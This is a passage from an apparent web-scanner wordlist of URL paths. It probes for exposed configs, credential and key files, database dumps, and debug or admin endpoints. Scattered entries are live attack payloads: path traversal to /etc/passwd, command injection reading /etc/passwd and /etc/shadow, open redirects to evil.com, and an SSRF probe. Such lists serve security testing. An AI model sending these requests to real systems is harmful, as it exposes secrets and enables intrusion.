\"/api/v1/authorities\",\n      \"/api/v1/canal/config/1/1\",\n      \"/api/v1/health\",\n      \"/api/v1/healthz\",\n      \"/api/v1/label/<label_name>/values\",\n      \"/api/v1/label/__name__/values\",\n      \"/api/v1/label/job/values\",\n      \"/api/v1/metadata\",\n      \"/api/v1/namespaces\",\n      \"/api/v1/namespaces/default/pods\",\n      \"/api/v1/namespaces/default/secrets\",\n      \"/api/v1/namespaces/default/services\",\n      \"/api/v1/nodes\",\n      \"/api/v1/query\",\n      \"/api/v1/query_range\",\n      \"/api/v1/query_range?query=up&start=1633730000&end=1633733600&step=15s\",\n      \"/api/v1/repositories\",\n      \"/api/v1/rules\",\n      \"/api/v1/series\",\n      \"/api/v1/session\",\n      \"/api/v1/status/config\",\n      \"/api/v1/status/label/<label_name>\",\n      \"/api/v1/status/metadata\",\n      \"/api/v1/status/rules\",\n      \"/api/v1/status/tsdb\",\n      \"/api/v1/status/tsdb/rules\",\n      \"/api/v1/swagger-ui/swagger.json\",\n      \"/api/v1/swagger-ui/swagger.yaml\",\n      \"/api/v1/swagger.json\",\n      \"/api/v1/swagger.yaml\",\n      \"/api/v1/targets\",\n      \"/api/v2\",\n      \"/api/v2.0/configuration\",\n      \"/api/v2.0/health\",\n      \"/api/v2.0/preference\",\n      \"/api/v2.0/projects\",\n      \"/api/v2.0/statistics\",\n      \"/api/v2.0/systeminfo\",\n      \"/api/v2.0/users\",\n      \"/api/v2/application.wadl\",\n      \"/api/v2/swagger.json\",\n      \"/api/v2/swagger.yaml\",\n      \"/api/v4/application/settings\",\n      \"/api/v4/groups\",\n      \"/api/v4/internal/allowed\",\n      \"/api/v4/internal/check\",\n      \"/api/v4/internal/lfs_authenticate\",\n      \"/api/v4/projects\",\n      \"/api/v4/users\",\n      \"/api/v6\",\n      \"/api/values/1\",\n      \"/api/vendor/phpunit/phpunit/phpunit\",\n      \"/api/whoami\",\n      \"/api_docs\",\n      \"/api_smartapp/storage/\",\n      \"/apidocs\",\n      \"/apidocs/\",\n      \"/apis\",\n      \"/apis/apps/v1/namespaces/default/deployments\",\n      \"/apis/ceph.rook.io/v1/namespaces/default/clusters/my-cluster\",\n      \"/apis/custom.metrics.k8s.io\",\n      \"/apis/external.metrics.k8s.io\",\n      \"/apis/metrics.k8s.io\",\n      \"/apis/v1\",\n      \"/apiv1/\",\n      \"/aplicacao/application/configs/application.ini\",\n      \"/app/config/parameters.yml\",\n      \"/app/config/parameters.yml.dist\",\n      \"/app/config/pimcore/google-api-private-key.json\",\n      \"/app/config/security.yml\",\n      \"/app/etc/local.xml\",\n      \"/app/google-services.json\",\n      \"/app/kibana\",\n      \"/app/kibana/\",\n      \"/app/logs\",\n      \"/app/settings.py\",\n      \"/App_Data/\",\n      \"/app_dev.php\",\n      \"/app_dev.php/cache\",\n      \"/App_Master/Telerik.Web.UI.DialogHandler.aspx?dp=1\",\n      \"/app_test.php\",\n      \"/application.ini\",\n      \"/application.wadl\",\n      \"/application.wadl?detail=true\",\n      \"/application/configs/application.ini\",\n      \"/application/logs/access.log\",\n      \"/application/logs/application.log\",\n      \"/application/logs/default.log\",\n      \"/apps/vendor/phpunit/phpunit/phpunit\",\n      \"/appsettings.json\",\n      \"/appspec.yaml\",\n      \"/appspec.yml\",\n      \"/appveyor.yml\",\n      \"/asdf.php\",\n      \"/AsiCommon/Controls/ContentManagement/ContentDesigner/Telerik.Web.UI.DialogHandler.aspx?dp=1\",\n      \"/assets\",\n      \"/assets../.git/config\",\n      \"/assets/.gitignore\",\n      \"/assets/config.rb\",\n      \"/assets/credentials.json\",\n      \"/assets/file\",\n      \"/assets/other/service-account-credentials.json\",\n      \"/asynchPeople/\",\n      \"/auditevents\",\n      \"/aura\",\n      \"/auth\",\n      \"/auth.html\",\n      \"/auth/login\",\n      \"/auth/realms/master/.well-known/openid-configuration\",\n      \"/auth/token\",\n      \"/authorization.do\",\n      \"/autoconfig\",\n      \"/autodiscover/\",\n      \"/autoupdate/\",\n      \"/aws.sh\",\n      \"/awstats.conf\",\n      \"/awstats.pl\",\n      \"/awstats/\",\n      \"/axis/\",\n      \"/axis/happyaxis.jsp\",\n      \"/axis2-web/HappyAxis.jsp\",\n      \"/axis2/\",\n      \"/axis2/axis2-web/HappyAxis.jsp\",\n      \"/azure-pipelines.yml\",\n      \"/backend\",\n      \"/backup\",\n      \"/backup.sh\",\n      \"/backup.sql\",\n      \"/backup/vendor/phpunit/phpunit/phpunit\",\n      \"/base/static/c\",\n      \"/beans\",\n      \"/bin/catalina.sh\",\n      \"/bin/console\",\n      \"/BitKeeper/etc/config\",\n      \"/bitrix/admin/index.php?login=yes\",\n      \"/blog/?alg_wc_ev_verify_email=eyJpZCI6MSwiY29kZSI6MH0=\",\n      \"/blog/phpmyadmin/\",\n      \"/bower.json\",\n      \"/brightmail/servlet/com.ve.kavachart.servlet.ChartStream?sn=../../WEB\",\n      \"/bugs/verify.php?confirm_hash=&id=1\",\n      \"/build\",\n      \"/build.sh\",\n      \"/bundles/kibana.style.css\",\n      \"/bundles/login.bundle.js\",\n      \"/cacti/\",\n      \"/ceph/health\",\n      \"/ceph/mon_status\",\n      \"/ceph/osd_status\",\n      \"/certenroll/\",\n      \"/certprov/\",\n      \"/certs\",\n      \"/certsrv/\",\n      \"/cfcache.map\",\n      \"/CFIDE/administrator/images/background.jpg\",\n      \"/cfide/administrator/images/background.jpg\",\n      \"/CFIDE/administrator/images/componentutilslogin.jpg\",\n      \"/cfide/administrator/images/componentutilslogin.jpg\",\n      \"/CFIDE/administrator/images/mx_login.gif\",\n      \"/cfide/administrator/images/mx_login.gif\",\n      \"/cgi\",\n      \"/cgi-bin/nagios3/status.cgi\",\n      \"/cgi-bin/nagios4/status.cgi\",\n      \"/cgi-bin/php\",\n      \"/cgi-bin/printenv.pl\",\n      \"/cgi-bin/upload/web-ftp.cgi\",\n      \"/CGI/Java/Serviceability?adapter=device.statistics.configuration\",\n      \"/CgiStart?page=Single\",\n      \"/CHANGELOG.md\",\n      \"/chaos\",\n      \"/ckeditor/samples/\",\n      \"/client_secrets.json\",\n      \"/clientaccesspolicy.xml\",\n      \"/cloud-config.yml\",\n      \"/cloudexp/application/configs/application.ini\",\n      \"/cloudfoundryapplication\",\n      \"/cluster\",\n      \"/cluster/cluster\",\n      \"/clusters\",\n      \"/cms/application/configs/application.ini\",\n      \"/cms/portlets/Telerik.Web.UI.DialogHandler.aspx?dp=1\",\n      \"/cobbler_api\",\n      \"/commands\",\n      \"/common/admin/Calendar/Telerik.Web.UI.DialogHandler.aspx?dp=1\",\n      \"/common/admin/Jobs2/Telerik.Web.UI.DialogHandler.aspx?dp=1\",\n      \"/common/admin/PhotoGallery2/Telerik.Web.UI.DialogHandler.aspx?dp=1\",\n      \"/compaction\",\n      \"/compile.sh\",\n      \"/compile/\",\n      \"/composer.json\",\n      \"/composer.lock\",\n      \"/composer.phar\",\n      \"/conditions\",\n      \"/conf/\",\n      \"/conf/cassandra-env.sh\",\n      \"/conf/cassandra.yaml\",\n      \"/conf/httpd.conf\",\n      \"/conf/tomcat-users.xml\",\n      \"/conf/zoo.cfg\",\n      \"/config\",\n      \"/config.inc.php\",\n      \"/config.js\",\n      \"/config.php\",\n      \"/config.php.bak\",\n      \"/config.rb\",\n      \"/config.sh\",\n      \"/config/\",\n      \"/config/configuration.yml\",\n      \"/config/database.yml\",\n      \"/config/database.yml.enc\",\n      \"/config/databases.yml\",\n      \"/config/db.php\",\n      \"/config/elasticsearch.yml\",\n      \"/config/environment.rb\",\n      \"/config/error_log\",\n      \"/config/initializers/secret_token.rb\",\n      \"/config/jvm.options\",\n      \"/config/jwt/private.pem\",\n      \"/config/log4j2.properties\",\n      \"/config/master.key\",\n      \"/config/packages/security.yaml\",\n      \"/config/properties.ini\",\n      \"/config/secrets.yml\",\n      \"/config/security.yml\",\n      \"/config/settings.local.yml\",\n      \"/config/settings.yml\",\n      \"/config/storage.yml\",\n      \"/config/user.xml\",\n      \"/config_dump\",\n      \"/configprops\",\n      \"/configs/api\",\n      \"/configuration.php\",\n      \"/configuration.php-dist\",\n      \"/configuration.yml\",\n      \"/configurations/config_default\",\n      \"/configure/app/landing/welcome-srm-va.html\",\n      \"/configz\",\n      \"/confluence\",\n      \"/conn.php.bak\",\n      \"/connz\",\n      \"/console\",\n      \"/console/login/LoginForm.jsp\",\n      \"/consoles\",\n      \"/containerLogs\",\n      \"/containers/json\",\n      \"/content../.git/config\",\n      \"/context.json\",\n      \"/control\",\n      \"/control/login\",\n      \"/controller/config\",\n      \"/controller/registry\",\n      \"/controller/registry-clients\",\n      \"/core-cloud-config.yml\",\n      \"/core/config/databases.yml\",\n      \"/counters\",\n      \"/cp/Shares?user=&protocol=webaccess&v=2.3\",\n      \"/credentials.db\",\n      \"/credentials.json\",\n      \"/crossdomain.xml\",\n      \"/crowd/console/login.action\",\n      \"/crowd/plugins/servlet/exp?cmd=cat%20/etc/shadow\",\n      \"/crx/de/index.jsp\",\n      \"/css../.git/config\",\n      \"/CTCWebService/CTCWebServiceBean\",\n      \"/CTCWebService/CTCWebServiceBean?wsdl\",\n      \"/darkstat/\",\n      \"/dasbhoard/\",\n      \"/dashboard\",\n      \"/dashboard/\",\n      \"/dashboard/phpinfo.php\",\n      \"/dashboard/UserControl/CMS/Page/Telerik.Web.UI.DialogHandler.aspx/Desktopmodules/Admin/dnnWerk.Users/DialogHandler.aspx?dp=1\",\n      \"/data.sql\",\n      \"/data/\",\n      \"/data/adminer.php\",\n      \"/data/autosuggest\",\n      \"/data/db/mysql/user.frm\",\n      \"/data/pgdata/pg_hba.conf\",\n      \"/data/version-2/\",\n      \"/data?get=prodServerGen\",\n      \"/database.php.bak\",\n      \"/database.sql\",\n      \"/database/schema.rb\",\n      \"/db.php.bak\",\n      \"/db.sql\",\n      \"/db/\",\n      \"/db/robomongo.json\",\n      \"/db/schema.rb\",\n      \"/db_backup.sql\",\n      \"/db_config.php.bak\",\n      \"/dbaas_monitor/login\",\n      \"/dbdump.sql\",\n      \"/debug\",\n      \"/debug.cgi\",\n      \"/debug.seam\",\n      \"/debug/\",\n      \"/debug/compactor\",\n      \"/debug/consolidations\",\n      \"/debug/default/view\",\n      \"/debug/default/view.html\",\n      \"/debug/flush\",\n      \"/debug/health\",\n      \"/debug/http\",\n      \"/debug/log\",\n      \"/debug/metrics\",\n      \"/debug/mysql_debug/pprof\",\n      \"/debug/mysql_debug/vars\",\n      \"/debug/mysql_schema\",\n      \"/debug/mysql_stats/queries\",\n      \"/debug/mysql_stats/schema\",\n      \"/debug/mysql_stats/vschema\",\n      \"/debug/mysql_waiters\",\n      \"/debug/pprof\",\n      \"/debug/pprof/block\",\n      \"/debug/pprof/heap\",\n      \"/debug/pprof/threadcreate\",\n      \"/debug/pprof/trace\",\n      \"/debug/query_plans\",\n      \"/debug/queryz\",\n      \"/debug/requests\",\n      \"/debug/route/\",\n      \"/debug/schemaz\",\n      \"/debug/stacks\",\n      \"/debug/status\",\n      \"/debug/tschema\",\n      \"/debug/vars\",\n      \"/debug/vschema\",\n      \"/debuginfo\",\n      \"/default.php.bak\",\n      \"/demo\",\n      \"/dependencies\",\n      \"/deploy.sh\",\n      \"/descriptorByName/AuditTrailPlugin/regexCheck?value=*j%3Ch1%3Esample\",\n      \"/desktop.ini\",\n      \"/DesktopModule/UIQuestionControls/UIAskQuestion/Telerik.Web.UI.DialogHandler.aspx?dp=1\",\n      \"/DesktopModules/Admin/RadEditorProvider/DialogHandler.aspx?dp=1\",\n      \"/desktopmodules/dnnwerk.radeditorprovider/dialoghandler.aspx?dp=1\",\n      \"/desktopmodules/telerikwebui/radeditorprovider/telerik.web.ui.dialoghandler.aspx?dp=1\",\n      \"/DesktopModules/TNComments/Telerik.Web.UI.DialogHandler.aspx?dp=1\",\n      \"/destination\",\n      \"/dev2local.sh\",\n      \"/development.log\",\n      \"/dfshealth.html\",\n      \"/dialin/\",\n      \"/dispatcher/invalidate.cache\",\n      \"/django/settings.py\",\n      \"/doc/page/login.asp\",\n      \"/doc/script/common.js\",\n      \"/docker-cloud.yml\",\n      \"/docker-compose-dev.yml\",\n      \"/docker-compose.dev.yml\",\n      \"/docker-compose.override.yml\",\n      \"/docker-compose.prod.yml\",\n      \"/docker-compose.production.yml\",\n      \"/docker-compose.staging.yml\",\n      \"/docker-compose.yml\",\n      \"/Dockerrun.aws.json\",\n      \"/docs\",\n      \"/docs/swagger.json\",\n      \"/domcfg.nsf\",\n      \"/download\",\n      \"/druid/coordinator/v1/leader\",\n      \"/druid/coordinator/v1/metadata/datasources\",\n      \"/druid/index.html\",\n      \"/druid/indexer/v1/taskStatus\",\n      \"/dump\",\n      \"/dump.sql\",\n      \"/dwr/index.html\",\n      \"/eam/vib?id=/etc/issue\",\n      \"/ecp/\",\n      \"/editor/ckeditor/samples/\",\n      \"/elfinder.html\",\n      \"/elmah.axd\",\n      \"/elocker_old/storage/\",\n      \"/emergency.php\",\n      \"/env\",\n      \"/env.dev.js\",\n      \"/env.development.js\",\n      \"/env.js\",\n      \"/env.prod.js\",\n      \"/env.production.js\",\n      \"/env.sh\",\n      \"/env.test.js\",\n      \"/environment.rb\",\n      \"/equipbid/storage/\",\n      \"/error\",\n      \"/error.log\",\n      \"/error.txt\",\n      \"/error/error.log\",\n      \"/error_log\",\n      \"/error_log.txt\",\n      \"/errors.log\",\n      \"/errors.txt\",\n      \"/errors/errors.log\",\n      \"/errors_log\",\n      \"/etc\",\n      \"/etc/\",\n      \"/events../.git/config\",\n      \"/evil%E3%80%82com\",\n      \"/evil.com/\",\n      \"/evil.com//\",\n      \"/ews/\",\n      \"/examples/jsp/index.html\",\n      \"/examples/jsp/snp/snoop.jsp\",\n      \"/examples/servlets/index.html\",\n      \"/examples/websocket/index.xhtml\",\n      \"/exchange/\",\n      \"/exchweb/\",\n      \"/exec\",\n      \"/explore\",\n      \"/explorer\",\n      \"/explorer/api-docs\",\n      \"/explorer/swagger-ui\",\n      \"/express\",\n      \"/express-graphql\",\n      \"/express-server.js\",\n      \"/extdirect\",\n      \"/favicon.ico\",\n      \"/fckeditor/_samples/default.html\",\n      \"/federate\",\n      \"/fetch\",\n      \"/filemanager/upload.php\",\n      \"/filezilla.xml\",\n      \"/FileZilla.xml\",\n      \"/filter/jmol/js/jsmol/php/jsmol.php?call=getRawDataFromDatabase&query=file\",\n      \"/final/\",\n      \"/firebase-debug.log\",\n      \"/flags\",\n      \"/flask.session\",\n      \"/flow/registries\",\n      \"/footer.php.bak\",\n      \"/forum/phpmyadmin/\",\n      \"/frontend/web/debug/default/view\",\n      \"/ftpsync.settings\",\n      \"/function\",\n      \"/fw.login.php\",\n      \"/gallery/zp\",\n      \"/gatewayz\",\n      \"/Gemfile\",\n      \"/Gemfile.lock\",\n      \"/gems\",\n      \"/getcfg.php\",\n      \"/getFavicon?host=burpcollaborator.net\",\n      \"/git-receive-pack\",\n      \"/global\",\n      \"/Global.asax\",\n      \"/glpi/status.php\",\n      \"/glpi2/status.php\",\n      \"/google-api-private-key.json\",\n      \"/google-services.json\",\n      \"/gotoURL.asp?url=google.com&id=43569\",\n      \"/grafana\",\n      \"/graph\",\n      \"/graph_cms\",\n      \"/graphiql\",\n      \"/graphiql.css\",\n      \"/graphiql.js\",\n      \"/graphiql.min.css\",\n      \"/graphiql.min.js\",\n      \"/graphiql.php\",\n      \"/graphiql/finland\",\n      \"/graphql\",\n      \"/graphql-console\",\n      \"/graphql-devtools\",\n      \"/graphql-explorer\",\n      \"/graphql-playground\",\n      \"/graphql-playground-html\",\n      \"/graphql.php\",\n      \"/graphql/console\",\n      \"/graphql/graphql\",\n      \"/graphql/graphql-playground\",\n      \"/graphql/schema.json\",\n      \"/graphql/schema.xml\",\n      \"/graphql/schema.yaml\",\n      \"/graphql/v1\",\n      \"/groovyconsole\",\n      \"/groupexpansion/\",\n      \"/Gruntfile.coffee\",\n      \"/Gruntfile.js\",\n      \"/hadoop/logs/userlogs/job_id/attempt_id/container_id/stdout\",\n      \"/happyaxis.jsp\",\n      \"/harbor\",\n      \"/header.php.bak\",\n      \"/health\",\n      \"/health_check\",\n      \"/healthcheck\",\n      \"/healthz\",\n      \"/heapdump\",\n      \"/home.html\",\n      \"/homepage.nsf\",\n      \"/hopfully404\",\n      \"/host-manager/html\",\n      \"/host.key\",\n      \"/hosts\",\n      \"/hsqldb%0a\",\n      \"/htdocs\",\n      \"/htdocs/.gitignore\",\n      \"/htdocs/.htaccess\",\n      \"/htdocs/robots.txt\",\n      \"/htpasswd\",\n      \"/httpd.conf\",\n      \"/hybridconfig/\",\n      \"/HyperGraphQL\",\n      \"/hystrix.stream\",\n      \"/i.php\",\n      \"/id_dsa\",\n      \"/id_rsa\",\n      \"/IdentityGuardSelfService/\",\n      \"/IdentityGuardSelfService/images/favicon.ico\",\n      \"/images../.git/config\",\n      \"/images/favicon.ico\",\n      \"/images/json\",\n      \"/img../.git/config\",\n      \"/IMS\",\n      \"/includes/.gitignore\",\n      \"/index.htm\",\n      \"/index.html\",\n      \"/index.jsp\",\n      \"/index.php\",\n      \"/index.php.bak\",\n      \"/index.php/admin/\",\n      \"/index.php?redirect=//evil.com\",\n      \"/index.php?redirect=/\\\\/evil.com/\",\n      \"/INF/maven/com.atlassian.jira/atlassian\",\n      \"/info\",\n      \"/info.php\",\n      \"/info/\",\n      \"/info/status\",\n      \"/infophp.php\",\n      \"/infos.php\",\n      \"/ingester\",\n      \"/init.sh\",\n      \"/inormalydonotexist\",\n      \"/iNotes/Forms5.nsf\",\n      \"/iNotes/Forms6.nsf\",\n      \"/iNotes/Forms7.nsf\",\n      \"/iNotes/Forms8.nsf\",\n      \"/iNotes/Forms85.nsf\",\n      \"/iNotes/Forms9.nsf\",\n      \"/install\",\n      \"/install.php\",\n      \"/install.php?profile=default\",\n      \"/install.sh\",\n      \"/installer\",\n      \"/interactive/docs\",\n      \"/interpreter\",\n      \"/intikal/storage/\",\n      \"/invoker/EJBInvokerServlet/\",\n      \"/invoker/JMXInvokerServlet\",\n      \"/invoker/JMXInvokerServlet/\",\n      \"/ioncube/loader-wizard.php\",\n      \"/ipython/tree\",\n      \"/irj/portal\",\n      \"/jasperserver/login.html?error=1\",\n      \"/je/graphql\",\n      \"/jeecg-boot/\",\n      \"/jenkins/descriptorByName/AuditTrailPlugin/regexCheck?value=*j%3Ch1%3Esample\",\n      \"/jenkins/script\",\n      \"/jira/secure/Dashboard.jspa\",\n      \"/jkstatus\",\n      \"/jkstatus/\",\n      \"/jkstatus;\",\n      \"/jmx\",\n      \"/jmx-console\",\n      \"/jnlpJars/\",\n      \"/jobmanager/\",\n      \"/jobmanager/logs/\",\n      \"/jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd\",\n      \"/jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252ftmp%252fpoc\",\n      \"/jobs/\",\n      \"/jolokia\",\n      \"/jolokia/exec/ch.qos.logback.classic\",\n      \"/jolokia/list\",\n      \"/jolokia/version\",\n      \"/josso/%5C../invoker/EJBInvokerServlet/\",\n      \"/josso/%5C../invoker/JMXInvokerServlet/\",\n      \"/js../.git/config\",\n      \"/js/elfinder.min.js\",\n      \"/js/elFinder.version.js\",\n      \"/jsapi_ticket.json\",\n      \"/jsonapi/user/user\",\n      \"/jsp/help\",\n      \"/jwt/private.pem\",\n      \"/kafka-manager/\",\n      \"/karma.conf.js\",\n      \"/key.pem\",\n      \"/keybase.txt\",\n      \"/keycloak.json\",\n      \"/kustomization.yml\",\n      \"/laravel\",\n      \"/laravel-graphql-playground\",\n      \"/leader\",\n      \"/leafz\",\n      \"/lfm.php\",\n      \"/lib../.git/config\",\n      \"/lib/phpunit/phpunit/phpunit\",\n      \"/libraries/joomla/database/\",\n      \"/libs/granite/core/content/login/favicon.ico\",\n      \"/LICENSE.txt\",\n      \"/linusadmin-phpinfo.php\",\n      \"/linuxki/experimental/vis/kivis.php?type=kitrace&pid=0;echo%20START;cat%20/etc/passwd;echo%20END;\",\n      \"/listeners\",\n      \"/loader-wizard.php\",\n      \"/local2dev.sh\",\n      \"/local2prod.sh\",\n      \"/localhost.key\",\n      \"/localhost.sql\",\n      \"/LocalSettings.php\",\n      \"/log.log\",\n      \"/log.txt\",\n      \"/log/access.log\",\n      \"/log/debug.log\",\n      \"/log/development.log\",\n      \"/log/error.log\",\n      \"/log/errors.log\",\n      \"/log/firewall.log\",\n      \"/log/mobile.log\",\n      \"/log/production.log\",\n      \"/log/system.log\",\n      \"/log/vpn.log\",\n      \"/log/warn.log\",\n      \"/logfile\",\n      \"/loggers\",\n      \"/logging\",\n      \"/login\",\n      \"/login.jsp\",\n      \"/login.php\",\n      \"/login.php.bak\",\n      \"/login?next=%2F\",\n      \"/logon/LogonPoint/custom.html\",\n      \"/logon/LogonPoint/index.html\",\n      \"/logs\",\n      \"/logs.txt\",\n      \"/logs/access.log\",\n      \"/logs/awstats.pl\",\n      \"/logs/catalina.out\",\n      \"/logs/development.log\",\n      \"/logs/error.log\",\n      \"/logs/errors.log\",\n      \"/logs/production.log\",\n      \"/logs/system.log\",\n      \"/logstash.yml\",\n      \"/lol/graphql\",\n      \"/lookup\",\n      \"/m\",\n      \"/magmi/web/js/magmi_utils.js\",\n      \"/mailsms/s?func=ADMIN:appState&dumpConfig=/\",\n      \"/main.php.bak\",\n      \"/maintenance.flag\",\n      \"/manage\",\n      \"/management\",\n      \"/manager/html\",\n      \"/manifest.json\",\n      \"/mantis/verify.php?id=1&confirm_hash=\",\n      \"/mantisBT/verify.php?id=1&confirm_hash=\",\n      \"/mappings\",\n      \"/mcx/\",\n      \"/mcx/mcxservice.svc\",\n      \"/meaweb/os/mxperson\",\n      \"/media../.git/config\",\n      \"/meet/\",\n      \"/meeting/\",\n      \"/memory\",\n      \"/metadata\",\n      \"/metrics\",\n      \"/mgmt/tm/sys/management\",\n      \"/mgmt/tm/sys/management-ip\",\n      \"/microsoft\",\n      \"/MicroStrategy/servlet/taskProc?taskId=shortURL&taskEnv=xml&taskContentType=xml&srcURL=https\",\n      \"/mifs/c/d/android.html\",\n      \"/mifs/login.jsp\",\n      \"/mifs/user/login.jsp\",\n      \"/migration.db\",\n      \"/minio/prometheus\",\n      \"/mobile/error\",\n      \"/module/\",\n      \"/Modules/CMS/Telerik.Web.UI.DialogHandler.aspx?dp=1\",\n      \"/modules/system/assets/js/framework.combined-min.js\",\n      \"/modules/vendor/phpunit/phpunit/phpunit\",\n      \"/monitor\",\n      \"/monitor-uri\",\n      \"/monitor/conf\",\n      \"/monitor/health\",\n      \"/monitor/stat\",\n      \"/monitor_agent\",\n      \"/moto/application/configs/application.ini\",\n      \"/mrtg/\",\n      \"/MRTG/\",\n      \"/my.key\",\n      \"/my.ppk\",\n      \"/MyErrors.log\",\n      \"/mysql.initial.sql\",\n      \"/mysql.sql\",\n      \"/mysql/admin/\",\n      \"/mysql/mysqlmanager/\",\n      \"/mysqlbackup.sh\",\n      \"/mysqldump.sql\",\n      \"/nagios\",\n      \"/nagios/cgi-bin/status.cgi\",\n      \"/names.nsf/People?OpenView\",\n      \"/nbproject/project.properties\",\n      \"/nextcloud/index.php/login\",\n      \"/nginx.conf\",\n      \"/nginx_status\",\n      \"/ngrok2/ngrok.yml\",\n      \"/nifi-api/access/config\",\n      \"/node.json\",\n      \"/node/1?_format=hal_json\",\n      \"/node/details.json\",\n      \"/node_info\",\n      \"/node_info.json\",\n      \"/node_stats\",\n      \"/npm-debug.log\",\n      \"/npm-shrinkwrap.json\",\n      \"/nuxeo/login.jsp/pwn${31333333330+7}.xhtml\",\n      \"/OA_HTML/bin/sqlnet.log\",\n      \"/OA_HTML/jtfwrepo.xml\",\n      \"/oab/\",\n      \"/oauth-credentials.json\",\n      \"/oauth/token\",\n      \"/oauth2\",\n      \"/occ/v2/d2OzBcy\",\n      \"/oci/index\",\n      \"/ocsp/\",\n      \"/old/vendor/phpunit/phpunit/phpunit\",\n      \"/old_phpinfo.php\",\n      \"/oldsite/vendor/phpunit/phpunit/phpunit\",\n      \"/opcache\",\n      \"/opcache-status/\",\n      \"/opcache-status/opcache.php\",\n      \"/openapi.json\",\n      \"/openapi.yaml\",\n      \"/Orion/Login.aspx\",\n      \"/os/mxperson\",\n      \"/osd\",\n      \"/out_heap_dump\",\n      \"/ovirt-engine/\",\n      \"/owa/\",\n      \"/owa/auth/logon.aspx\",\n      \"/owncloud/config/\",\n      \"/package\",\n      \"/package-lock.json\",\n      \"/package.json\",\n      \"/pages\",\n      \"/pages/includes/status\",\n      \"/parameters.yml\",\n      \"/parameters.yml.dist\",\n      \"/Partners/application/configs/application.ini\",\n      \"/pdb/meta/v1/version\",\n      \"/PDC/ajaxreq.php?PARAM=127.0.0.1+\",\n      \"/perl\",\n      \"/perl-status\",\n      \"/persistentchat/\",\n      \"/pg\",\n      \"/pg_stat_activity\",\n      \"/pg_stat_bgwriter\",\n      \"/pg_stat_replication\",\n      \"/phoneconferencing/\",\n      \"/php\",\n      \"/php-fpm.conf\",\n      \"/php-info.php\",\n      \"/php-opcache-status/\",\n      \"/php.ini\",\n      \"/php.php\",\n      \"/php/adminer.php\",\n      \"/php/phpmyadmin/\",\n      \"/php_info.php\",\n      \"/phpinfo.php\",\n      \"/phpmyadmin/\",\n      \"/phpMyAdmin/\",\n      \"/phpPgAdmin\",\n      \"/phppgadmin/intro.php\",\n      \"/phpstan.neon\",\n      \"/phpunit.xml\",\n      \"/phpversion.php\",\n      \"/pimcore/app/config/pimcore/google-api-private-key.json\",\n      \"/pinfo.php\",\n      \"/playground\",\n      \"/plesk-stat/\",\n      \"/plugin/build\",\n      \"/pluginManager\",\n      \"/plugins\",\n      \"/plugins/servlet/gadgets/makeRequest?url=https\",\n      \"/plugins/servlet/gadgets/makeRequest?url=https://google.com\",\n      \"/plugins/servlet/oauth/users/icon\",\n      \"/pma/\",\n      \"/PMUser/\",\n      \"/pods\",\n      \"/podSandboxStatus\",\n      \"/pools/default/buckets\",\n      \"/portal\",\n      \"/portal-graphql\",\n      \"/portal/favicon.ico\",\n      \"/portal/images/MyVue/MyVueHelp.png\",\n      \"/powershell/\",\n      \"/pprof\",\n      \"/private\",\n      \"/private-key\",\n      \"/private.pem\",\n      \"/privatekey.key\",\n      \"/probes\",\n      \"/proc/self/environ\",\n      \"/prod2local.sh\",\n      \"/production.log\",\n      \"/profile\",\n      \"/proftpd.conf\",\n      \"/properties.ini\",\n      \"/provider.tf\",\n      \"/Providers/HtmlEditorProviders/Telerik/Telerik.Web.UI.DialogHandler.aspx?dp=1\",\n      \"/proxy\",\n      \"/proxy.pac\",\n      \"/proxy.stream?origin=http\",\n      \"/proxytest.jsp\",\n      \"/proxytui\",\n      \"/PRTG/index.htm\",\n      \"/prtg/index.htm\",\n      \"/prweb/PRRestService/unauthenticatedAPI/v1/docs\",\n      \"/public\",\n      \"/public/\",\n      \"/public/adminer.php\",\n      \"/public/config.js\",\n      \"/public/plugins/alertlist/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd\",\n      \"/public/plugins/dashboard/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd\",\n      \"/public/plugins/debug/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd\",\n      \"/public/plugins/grafana/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd\",\n      \"/public/plugins/icon/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd\",\n      \"/public/plugins/mysql/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd\",\n      \"/public/plugins/prometheus/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd\",\n      \"/public/plugins/testdata/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd\",\n      \"/public/plugins/timeseries/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd\",\n      \"/public/plugins/welcome/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd\",\n      \"/public/plugins/zipkin/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd\",\n      \"/publicadminer.php\",\n      \"/pyproject.toml\",\n      \"/query\",\n      \"/query-api\",\n      \"/query-explorer\",\n      \"/query-laravel\",\n      \"/quitquitquit\",\n      \"/radio/application/configs/application.ini\",\n      \"/raft\",\n      \"/rails/actions?error=ActiveRecord\",\n      \"/rails/info\",\n      \"/rails/info/properties.json\",\n      \"/rails/info/routes.json\",\n      \"/railsapp/config/storage.yml\",\n      \"/reach/sip.svc\",\n      \"/read_file\",\n      \"/readfile\",\n      \"/README.md\",\n      \"/readme.txt\",\n      \"/ready\",\n      \"/readyz\",\n      \"/redis.conf\",\n      \"/redmine/config/configuration.yml\",\n      \"/redmine/config/environment.rb\",\n      \"/redmine/config/initializers/secret_token.rb\",\n      \"/redmine/config/secrets.yml\",\n      \"/redmine/config/settings.yml\",\n      \"/redoc\",\n      \"/regions\",\n      \"/registrar\",\n      \"/registryproxy\",\n      \"/reminder.sh\",\n      \"/remote/login\",\n      \"/repair\",\n      \"/Reports/Pages/Folder.aspx\",\n      \"/ReportServer\",\n      \"/ReportServer/Pages/ReportViewer.aspx\",\n      \"/requesthandler/\",\n      \"/requesthandlerext/\",\n      \"/rest/api/2/dashboard?maxResults=100\",\n      \"/rest/api/2/project?maxResults=100\",\n      \"/rest/api/latest/groupuserpicker?query=1&maxResults=50000&showAvatar=true\",\n      \"/rest/api/latest/serverInfo\",\n      \"/rest/beta/repositories/go/group\",\n      \"/rest/tinymce/1/macro/preview\",\n    